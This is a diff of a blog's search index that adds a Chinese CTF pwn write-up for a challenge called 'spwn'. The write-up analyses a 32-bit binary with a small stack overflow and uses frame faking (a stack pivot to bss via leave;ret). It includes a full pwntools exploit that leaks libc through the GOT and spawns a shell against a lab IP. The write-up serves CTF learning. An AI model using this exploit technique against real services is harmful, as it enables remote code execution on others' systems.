@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>[pwn] spwn WriteUp</title>
+      <link href="/2019/10070.html"/>
+      <url>/2019/10070.html</url>
+      
+        <content type="html"><![CDATA[<p>这个题来自于<a href="https://196011564.github.io/" target="_blank" rel="noopener">咲夜南梦</a>师傅</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>checksec 一下</p><p><img src="../pics/20191007000.png" alt="checksec"></p><p>然后 IDA 静态分析一下</p><p><img src="../pics/20191007001.png" alt="main"></p><p><img src="../pics/20191007002.png" alt="vul_function"></p><p>可以看到，在 main 中调用了 vul_function, 而在 vul_function 中有两次读取，第一次读取 0x200 字节到 bss 段，第二次读取到 stack 中</p><p>查看一下 stack 中 buf 相对于 ebp 的偏移为 0x18，而第二次读取的长度只有 0x20 所以只能覆盖到 ebp 和 ret addr，由于在栈处能够溢出的字节太少，不足以构造较长的 gadget，又看到第一次往 bss 读取时读取长度很充足，并且程序没有开启 PIE 保护，bss 段是知道地址的，于是考虑能否利用 bss 段实现攻击</p><p>注意到在 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/#frame-faking" target="_blank" rel="noopener">CTF Wiki # frame faking</a> 讲到了一种叫做 Frame Faking 的方法，即伪造栈帧，就恰巧是用于溢出字节较少且有其他可控制内存区域的情形的。仔细看完介绍后，大概理解是怎么回事了，利用两次 leave, ret (<strong>函数正常返回一次，溢出控制返回地址指向 leave, ret 再一次</strong>) 实现栈帧伪造。</p><p>主要思路有了之后写出漏洞利用脚本就简单了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">def leak(func_name, func_addr):</span><br><span class="line">    libc = LibcSearcher(func_name, func_addr)</span><br><span class="line">    libc_base = func_addr - libc.dump(func_name)</span><br><span class="line">    sys_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">    sh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">    return (sys_addr, sh_addr)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    elf = ELF(&quot;spwn&quot;)</span><br><span class="line">    write_plt = elf.plt[b&quot;write&quot;]</span><br><span class="line">    read_got = elf.got[b&quot;read&quot;]</span><br><span class="line">    main_addr = 0x08048513</span><br><span class="line">    leave_ret = 0x08048511</span><br><span class="line">    bss_addr = 0x0804a300</span><br><span class="line">    </span><br><span class="line">    r = remote(&quot;192.168.136.129&quot;, 9999)</span><br><span class="line">    </span><br><span class="line">    payload = b&quot;a&quot;*4 + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(4)</span><br><span class="line">    r.sendafter(&quot;name?&quot;, payload)</span><br><span class="line">    </span><br><span class="line">    payload = b&quot;a&quot;*0x18 + p32(bss_addr) + p32(leave_ret)</span><br><span class="line">    r.sendafter(&quot;say?&quot;, payload)</span><br><span class="line">    </span><br><span class="line">    read_leak = u32(r.recv(4))</span><br><span class="line">    sys_addr, sh_addr = leak(&quot;read&quot;, read_leak)</span><br><span class="line"></span><br><span class="line">    payload = b&quot;a&quot;*4 + p32(sys_addr) + p32(main_addr) + p32(sh_addr)</span><br><span class="line">    r.sendafter(&quot;name?&quot;, payload)</span><br><span class="line">    </span><br><span class="line">    payload = b&quot;a&quot;*0x18 + p32(bss_addr) + p32(leave_ret)</span><br><span class="line">    r.sendafter(&quot;say?&quot;, payload)</span><br><span class="line">    </span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> pwn </tag>
+            
+            <tag> WriteUp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>在下又回来啦</title>
       <link href="/2019/10051.html"/>
       <url>/2019/10051.html</url>
@@ -340,9 +369,9 @@
             
             <tag> C </tag>
             
-            <tag> Summary </tag>
-            
             <tag> Programming </tag>
+            
+            <tag> Summary </tag>
             
         </tags>
       
@@ -479,9 +508,9 @@
             
             <tag> C </tag>
             
-            <tag> Summary </tag>
-            
             <tag> Programming </tag>
+            
+            <tag> Summary </tag>
             
         </tags>
       
